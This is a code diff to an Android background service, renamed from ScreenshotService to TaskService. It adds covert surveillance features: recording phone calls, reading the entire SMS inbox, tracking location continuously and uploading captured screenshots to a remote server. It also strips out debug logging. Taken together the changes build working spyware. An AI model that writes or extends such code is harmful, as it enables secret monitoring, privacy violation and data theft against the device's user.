@@ -14,6 +14,7 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioManager;
+import android.media.MediaRecorder;
 import android.media.MediaScannerConnection;
 import android.media.ToneGenerator;
 import android.media.projection.MediaProjection;
@@ -24,7 +25,6 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
-import android.provider.Settings;
 import android.util.Log;
 import android.view.WindowManager;
 
@@ -33,12 +33,22 @@ import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 import androidx.room.Room;
 
+import com.aykuttasil.callrecord.CallRecord;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Objects;
 
-public class ScreenshotService extends Service {
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+
+
+public class TaskService extends Service {
 
     private static final String CHANNEL_WHATEVER = "channel_whatever";
     private static final int NOTIFY_ID = 9906;
@@ -83,7 +93,7 @@ public class ScreenshotService extends Service {
         handlerThread.start();
         handler = new Handler(handlerThread.getLooper());
         bindLocation();
-
+        bindCallRecorder();
     }
 
     @SuppressLint("MissingPermission")
@@ -101,7 +111,6 @@ public class ScreenshotService extends Service {
                         taskDao.insertLocation(model);
                     }
                 }).start();
-                Log.d("BAG", "Service: " + model.toString());
 
             }
 
@@ -121,7 +130,20 @@ public class ScreenshotService extends Service {
             }
         };
         LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
-        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000, 10, locationListener);
+        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
+    }
+
+    private void bindCallRecorder(){
+        CallRecord callRecord = new CallRecord.Builder(this)
+                .setRecordFileName("rec")
+                .setRecordDirName("callRecord")
+                .setRecordDirPath(Objects.requireNonNull(getExternalFilesDir(null)).getAbsolutePath())
+                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
+                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                .setShowSeed(true)
+                .build();
+        callRecord.startCallRecordService();
     }
 
 
@@ -176,9 +198,7 @@ public class ScreenshotService extends Service {
             @SuppressLint("SimpleDateFormat")
             @Override
             public void run() {
-                File output = new File(getExternalFilesDir(null), sdf.format(new Date()) + "-screenshot.png");
-
-                Log.d("BAG", output.getAbsolutePath());
+                File output = new File(getExternalFilesDir("screens"), sdf.format(new Date()) + "-screenshot.png");
 
                 try {
                     FileOutputStream fos = new FileOutputStream(output);
@@ -188,7 +208,7 @@ public class ScreenshotService extends Service {
                     fos.getFD().sync();
                     fos.close();
 
-                    MediaScannerConnection.scanFile(ScreenshotService.this,
+                    MediaScannerConnection.scanFile(TaskService.this,
                             new String[]{output.getAbsolutePath()},
                             new String[]{"image/png"},
                             null);
@@ -228,33 +248,20 @@ public class ScreenshotService extends Service {
                 VIRT_DISPLAY_FLAGS, it.getSurface(), null, handler);
         projection.registerCallback(cb, handler);
 
-//        final LocationModel model = new LocationModel();
-//        model.setTime(sdf.format(new Date()));
-//        model.setLat(mCurrentLocation.getLatitude());
-//        model.setLon(mCurrentLocation.getLongitude());
-//        new Thread(new Runnable() {
-//            @Override
-//            public void run() {
-//                taskDao.insertLocation(model);
-//            }
-//        }).start();
-//
-//        Log.d("BAG", String.valueOf(model.getLat()));
-
+        // Sms reader
         StringBuilder msgData = new StringBuilder();
         @SuppressLint("Recycle") Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
-        if (cursor.moveToFirst()) { // must check the result to prevent exception
+        assert cursor != null;
+        if (cursor.moveToFirst()) {
             do {
                 for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                     msgData.append(" ").append(cursor.getColumnName(idx)).append(":").append(cursor.getString(idx));
                 }
-                // use msgData
             } while (cursor.moveToNext());
-        } else {
-            // empty box, no SMS
         }
 
-        Log.d("BAG", msgData.toString());
+        uploadFiles();
+
     }
 
     private void foregrounding() {
@@ -294,6 +301,35 @@ public class ScreenshotService extends Service {
         i.setAction(action);
 
         return (PendingIntent.getService(this, 0, i, 0));
+    }
+
+
+    private void uploadFiles(){
+        File origFile = null;
+        File[] fileList = getExternalFilesDir("screens").getAbsoluteFile().listFiles();
+        assert fileList != null;
+        for (File file : fileList){
+            if (file.getName().endsWith(".png")){
+                origFile = file;
+            }
+        }
+
+        Map<String, File> params = new HashMap<>();
+        params.put("screenshot", origFile);
+
+        ApiClient.getRetrofitInterface().uploadFile(params).enqueue(new Callback<ParseResponse>() {
+            @Override
+            public void onResponse(Call<ParseResponse> call, Response<ParseResponse> response) {
+                if (response.isSuccessful()){
+                }
+            }
+
+            @Override
+            public void onFailure(Call<ParseResponse> call, Throwable t) {
+                Log.d("BAG", t.getMessage());
+            }
+        });
+
     }
 
 }
